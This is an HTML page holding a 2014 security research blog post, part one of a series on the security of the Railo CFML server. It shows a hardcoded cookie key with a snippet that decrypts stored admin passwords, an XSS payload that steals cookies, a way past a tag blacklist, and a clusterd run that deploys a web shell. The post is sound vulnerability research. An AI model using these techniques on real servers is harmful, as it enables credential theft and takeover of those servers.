@@ -1,0 +1,485 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>railo security - part one - intro - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Part one &ndash; intro
+Part two &ndash; post-authentication rce
+Part three &ndash; pre-authentication lfi
+Part four &ndash; pre-authentication rce &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Railo Security - Part One - Intro</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-25T14:00:00-07:00" pubdate data-updated="true">Jun 25<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><em>Part one &ndash; intro</em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/07/24/railo-security-part-two/">Part two &ndash; post-authentication rce</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/23/railo-security-part-three/">Part three &ndash; pre-authentication lfi</a></em><br/>
+<em><a href="http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/">Part four &ndash; pre-authentication rce</a></em></p>
+
+<p><a href="http://getrailo.org/">Railo</a> is an open-source alternative to the popular Coldfusion application server, implementing a FOSSy CFML engine and application server.  It emulates Coldfusion in a variety of ways, mainly features coming straight from the CF world, along with several of it&rsquo;s own unique features (clustered servers, a plugin architecture, etc).  In this four-part series, we&rsquo;ll touch on how Railo, much like Coldfusion, can be used to gain access to a system or network of systems.  I will also be examining several pre-authentication RCE vulnerabilities discovered in the platform during this audit.  I&rsquo;ll be pimping <a href="https://github.com/hatRiot/clusterd">clusterd</a> throughout to exemplify how it can help achieve some of these goals.  These posts are the result of a combined effort between myself and Stephen Breen (@breenmachine).</p>
+
+<p>I&rsquo;ll preface this post with a quick rundown on what we&rsquo;re working with; public versions of Railo run from versions 3.0 to 4.2, with 4.2.1 being the latest release as of posting.  The code is also freely available on <a href="github.com/getrailo/railo">Github</a>; much of this post&rsquo;s code samples have been taken from the 4.2 branch or the master.  Hashes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ git branch
+</span><span class='line'>* master
+</span><span class='line'>$ git rev-parse master
+</span><span class='line'>694e8acf1a762431eab084da762a0abbe5290f49</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And a quick rundown of the code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cloc ./
+</span><span class='line'>    3689 text files.
+</span><span class='line'>    3571 unique files.                                          
+</span><span class='line'>     151 files ignored.
+</span><span class='line'>
+</span><span class='line'>http://cloc.sourceforge.net v 1.60  T=7.74 s (452.6 files/s, 60622.4 lines/s)
+</span><span class='line'>---------------------------------------------------------------------------------
+</span><span class='line'>Language                       files          blank        comment           code
+</span><span class='line'>---------------------------------------------------------------------------------
+</span><span class='line'>Java                            2786          66639          69647         258015
+</span><span class='line'>ColdFusion                       315           5690           3089          35890
+</span><span class='line'>ColdFusion CFScript              352           4377            643          15856
+</span><span class='line'>XML                               22            526            563           5773
+</span><span class='line'>Javascript                        14             46            252            733
+</span><span class='line'>Ant                                4             38             70            176
+</span><span class='line'>DTD                                4            283            588            131
+</span><span class='line'>CSS                                5             52             16             77
+</span><span class='line'>HTML                               1              0              0              1
+</span><span class='line'>---------------------------------------------------------------------------------
+</span><span class='line'>SUM:                            3503          77651          74868         316652
+</span><span class='line'>---------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Railo has two separate administrative web interfaces; server and web.  The two interfaces segregate functionality out into these categories; managing the actual server and managing the content served up by the server.  Server is available at <code>http://localhost:8888/railo-context/admin/server.cfm</code> and web is available at <code>http://localhost:8888/railo-context/admin/web.cfm</code>.  Both interfaces are configured with a single, shared password that is set AFTER the site has been initialized.  That is, the first person to hit the web server gets to choose the password.</p>
+
+<h4>Authentication</h4>
+
+<p>As stated, authentication requires only a single password, but locks an IP address out if too many failed attempts are performed.  The exact logic for this is as follows (<code>web.cfm</code>):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif loginPause and StructKeyExists(application,'lastTryToLogin') and IsDate(application.lastTryToLogin) and DateDiff("s",application.lastTryToLogin,now()) LT loginPause&gt;
+</span><span class='line'>        &lt;cfset login_error="Login disabled until #lsDateFormat(DateAdd("s",loginPause,application.lastTryToLogin))# #lsTimeFormat(DateAdd("s",loginPause,application.lastTryToLogin),'hh:mm:ss')#"&gt;
+</span><span class='line'>    &lt;cfelse&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A <code>Remember Me For</code> setting allows an authenticated session to last until logout or for a specified amount of time.  In the event that a cookie is saved for X amount of time, Railo actually encrypts the user&rsquo;s password and stores it as the authentication cookie.  Here&rsquo;s the implementation of this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfcookie expires="#DateAdd(form.rememberMe,1,now())#" name="railo_admin_pw_#ad#" value="#Encrypt(form["login_password"&ad],cookieKey,"CFMX_COMPAT","hex")#"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s right; a static key, defined as <code>&lt;cfset cookieKey="sdfsdf789sdfsd"&gt;</code>, is used as the key to the CFMX_COMPAT encryption algorithm for encrypting and storing the user&rsquo;s password client-side.  This is akin to simply base64&#8217;ing the password, as symmetric key security is dependant upon the secrecy of this shared key.</p>
+
+<p>To then verify authentication, the cookie is decrypted and compared to the current password (which is also known; more on this later):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfif not StructKeyExists(session,"password"&request.adminType) and StructKeyExists(cookie,'railo_admin_pw_#ad#')&gt;
+</span><span class='line'>    &lt;cfset fromCookie=true&gt;
+</span><span class='line'>    &lt;cftry&gt;
+</span><span class='line'>        &lt;cfset session["password"&ad]=Decrypt(cookie['railo_admin_pw_#ad#'],cookieKey,"CFMX_COMPAT","hex")&gt;
+</span><span class='line'>        &lt;cfcatch&gt;&lt;/cfcatch&gt;
+</span><span class='line'>    &lt;/cftry&gt;
+</span><span class='line'>&lt;/cfif&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For example, if my stored cookie was <code>RAILO_ADMIN_PW_WEB=6802AABFAA87A7</code>, we could decrypt this with a simple CFML page:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset tmp=Decrypt("6802AABFAA87A7", "sdfsdf789sdfsd", "CFMX_COMPAT", "hex")&gt;
+</span><span class='line'>&lt;cfdump var="#tmp#"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This would dump my plaintext password (which, in this case, is &ldquo;default&rdquo;).  This ups the ante with XSS, as we can essentially steal plaintext credentials via this vector.  Our cookie is graciously set without HTTPOnly or Secure: <code>Set-Cookie: RAILO_ADMIN_PW_WEB=6802AABFAA87A7;Path=/;Expires=Sun, 08-Mar-2015 06:42:31 GMT</code>._</p>
+
+<p>Another worthy mention is the fact that the plaintext password is stored in the session struct, as shown below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfset session["password"&request.adminType]=form["login_password"&request.adminType]&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to dump this, however, we&rsquo;d need to be able to write a CFM file (or code) within the context of web.cfm.  As a test, I&rsquo;ve placed a short CFM file on the host and set the error handler to invoke it.  <code>test.cfm</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfdump var="#session#"&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We then set the template handler to this file:</p>
+
+<p><img src="/images/posts/2014/railo/railo-error-handler.jpg"></p>
+
+<p>If we now hit a non-existent page, <code>/railo-context/xx.cfm</code> for example, we&rsquo;ll trigger the cfm and get our plaintext password:</p>
+
+<p><img src="/images/posts/2014/railo/railo-session-plaintext.jpg"></p>
+
+<h4>XSS</h4>
+
+<p>XSS is now awesome, because we can fetch the server&rsquo;s plaintext password.  Is there XSS in Railo?</p>
+
+<p><img src="/images/posts/2014/railo/railo-xss.jpg"></p>
+
+<p>Submitting to a CFM with malicious arguments triggers an error and injects unsanitized input.</p>
+
+<p>Post-authentication search:</p>
+
+<p><img src="/images/posts/2014/railo/railo-xss2.jpg"></p>
+
+<p>Submitting malicious input into the search bar will effectively sanitize out greater than/less than signs, but not inside of the saved form.  Injecting <code>"&gt;&lt;/form&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</code> will, of course, pop-up the cookie.</p>
+
+<p>How about stored XSS?</p>
+
+<p><img src="/images/posts/2014/railo/railo-xss3.jpg"></p>
+
+<p>A malicious mapping will trigger whenever the page is loaded; the only caveat being that the path must start with a /, and you cannot use the script tag.  Trivial to get around with any number of different tags.</p>
+
+<p>Speaking of, let&rsquo;s take a quick look at the sanitization routines.  They&rsquo;ve implemented their own routines inside of <code>ScriptProtect.java</code>, and it&rsquo;s a very simple blacklist:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  public static final String[] invalids=new String[]{
+</span><span class='line'>        "object", "embed", "script", "applet", "meta", "iframe"
+</span><span class='line'>    };</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They iterate over these values and perform a simple compare, and if a <em>bad</em> tag is found, they simply replace it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if(compareTagName(tagName)) {
+</span><span class='line'>            if(sb==null) {
+</span><span class='line'>                sb=new StringBuffer();
+</span><span class='line'>                last=0;
+</span><span class='line'>            }
+</span><span class='line'>            sb.append(str.substring(last,index+1));
+</span><span class='line'>            sb.append("invalidTag");
+</span><span class='line'>            last=endIndex;
+</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It doesn&rsquo;t take much to evade this filter, as I&rsquo;ve already described.</p>
+
+<p>CSRF kinda fits in here, how about CSRF?  Fortunately for users, and unfortunately for pentesters, there&rsquo;s not much we can do.  Although Railo does not enforce authentication for CFML/CFC pages, it does check read/write permissions on all accesses to the backend config file.  This is configured in the Server interface:</p>
+
+<p><img src="/images/posts/2014/railo/railo-server-pw.jpg"></p>
+
+<p>In the above image, if <code>Access Write</code> was configured to <code>open</code>, any user could submit modifications to the back-end configuration, including password resets, task scheduling, and more.  Though this is sufficiently locked down by default, this could provide a nice backdoor.</p>
+
+<h4>Deploying</h4>
+
+<p>Much like Coldfusion, Railo features a task scheduler that can be used to deploy shells.  A run of this in clusterd can be seen below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i192.168.1.219 -a railo -v4.1 --deploy ./src/lib/resources/cmd.cfml --deployer task --usr-auth default
+</span><span class='line'>
+</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
+</span><span class='line'>            [Supporting 6 platforms]
+</span><span class='line'>
+</span><span class='line'> [2014-05-01 10:04PM] Started at 2014-05-01 10:04PM
+</span><span class='line'> [2014-05-01 10:04PM] Servers' OS hinted at windows
+</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting host '192.168.1.219'
+</span><span class='line'> [2014-05-01 10:04PM] Server hinted at 'railo'
+</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server...
+</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Server Administrator...
+</span><span class='line'> [2014-05-01 10:04PM] Checking railo version 4.1 Railo Web Administrator...
+</span><span class='line'> [2014-05-01 10:04PM] Matched 3 fingerprints for service railo
+</span><span class='line'> [2014-05-01 10:04PM]   Railo Server (version 4.1)
+</span><span class='line'> [2014-05-01 10:04PM]   Railo Server Administrator (version 4.1)
+</span><span class='line'> [2014-05-01 10:04PM]   Railo Web Administrator (version 4.1)
+</span><span class='line'> [2014-05-01 10:04PM] Fingerprinting completed.
+</span><span class='line'> [2014-05-01 10:04PM] This deployer (schedule_task) requires an external listening port (8000).  Continue? [Y/n] &gt; 
+</span><span class='line'> [2014-05-01 10:04PM] Preparing to deploy cmd.cfml..
+</span><span class='line'> [2014-05-01 10:04PM] Creating scheduled task...
+</span><span class='line'> [2014-05-01 10:04PM] Task cmd.cfml created, invoking...
+</span><span class='line'> [2014-05-01 10:04PM] Waiting for remote server to download file [8s]]
+</span><span class='line'> [2014-05-01 10:04PM] cmd.cfml deployed to /cmd.cfml
+</span><span class='line'> [2014-05-01 10:04PM] Cleaning up...
+</span><span class='line'> [2014-05-01 10:04PM] Finished at 2014-05-01 10:04PM</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This works almost identically to the Coldfusion scheduler, and should not be surprising.</p>
+
+<p>One feature Railo has that isn&rsquo;t found in Coldfusion is the Extension or Plugin architecture; this allows custom extensions to run in the context of the Railo server and execute code and tags.  These extensions do not have access to the cfadmin tag (without authentication, that is), but we really don&rsquo;t need that for a simple web shell.  In the event that the Railo server is configured to not allow outbound traffic (hence rendering the Task Scheduler useless), this could be harnessed instead.</p>
+
+<p>Railo allows extensions to be uploaded directly to the server, found here:</p>
+
+<p><img src="/images/posts/2014/railo/railo-plugin-upload.jpg"></p>
+
+<p>Developing a plugin is sort of confusing and not exacty clear via their provided Github documentation, however the simplest way to do this is grab a pre-existing package and simply replace one of the functions with a shell.</p>
+
+<p>That about wraps up part one of our dive into Railo security; the remaining three parts will focus on several different vulnerabilities in the Railo framework, and how they can be lassoed together for pre-authentication RCE.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-25T14:00:00-07:00" pubdate data-updated="true">Jun 25<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/clusterd/'>clusterd</a>, <a class='category' href='/blog/categories/railo/'>railo</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one/" data-via="" data-counturl="http://hatRiot.github.io/blog/2014/06/25/railo-security-part-one/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/" title="Previous Post: rce in browser exploitation framework (BeEF)">&laquo; rce in browser exploitation framework (BeEF)</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/06/29/gitlist-rce/" title="Next Post: gitlist - commit to rce">gitlist - commit to rce &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
